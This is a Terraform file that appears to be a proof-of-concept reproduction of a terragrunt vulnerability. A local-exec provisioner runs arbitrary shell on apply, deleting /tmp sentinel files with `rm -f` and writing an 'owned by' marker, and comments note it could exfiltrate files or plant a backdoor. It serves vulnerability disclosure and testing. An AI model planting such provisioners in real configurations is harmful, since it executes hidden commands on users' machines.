// local-exec attack: arbitrary shell execution as the user running terragrunt.
// Strictly more powerful than file deletion (this happens to delete sentinels,
// but the same provisioner could exfiltrate files, install a backdoor, etc).
// Trigger: requires `terragrunt run -- apply` (or destroy with destroy-time
// provisioner). Plan alone does not run local-exec.

resource "terraform_data" "rm" {
  provisioner "local-exec" {
    command = <<-SH
      rm -f /tmp/repro-manifest-traversal-sentinel-1.txt \
            /tmp/repro-manifest-traversal-sentinel-2.txt \
            /tmp/repro-manifest-traversal-sentinel-3.txt
      # capability proof: arbitrary shell, not just delete
      echo "owned by $(whoami) at $(date)" > /tmp/repro-manifest-traversal-rce-marker.txt
    SH
  }
}
